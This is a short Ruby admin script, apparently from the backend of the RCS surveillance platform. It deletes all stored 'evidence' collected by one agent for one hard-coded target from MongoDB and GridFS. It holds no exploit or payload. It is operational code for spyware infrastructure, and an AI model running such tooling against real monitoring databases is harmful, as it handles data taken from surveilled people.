#
# copy in lib/rcs-db-release to make it work
#

require 'bundler/setup'
require 'mongo'
require 'rcs-common/trace'
require_relative 'db'

params = [
  # SERVER 2
    # TARGET 1
  {target_id: "4fa91bc77523291860000123", agent_id: "4fa91bcc75232918600002c4"},
]

def delete_evidence(params)
  target = ::Item.find(params[:target_id])
  agent = ::Item.find(params[:agent_id])

  evidences = Evidence.collection_class(target[:_id]).where(:aid => agent[:_id])

  puts "Deleting #{evidences.count} evidence from agent #{agent.name}"

  # copy the new evidence
  evidences.each do |ev|
    # delete the old one. NOTE CAREFULLY:
    # we use delete + explicit grid, since the callback in the destroy will fail
    # because the parent of aid in the evidence is already the new one
    ev.delete
    RCS::DB::GridFS.delete(ev.data['_grid'], target[:_id].to_s) unless ev.data['_grid'].nil?

    puts "Deleted evidence #{ev[:_id]}"
  end

  puts "Finished deleting from #{agent._kind} #{agent.name}"
end

RCS::DB::DB.instance.connect

params.each do |p|
  begin
    delete_evidence p
  rescue Mongo::OperationFailure
    retry
  end
end
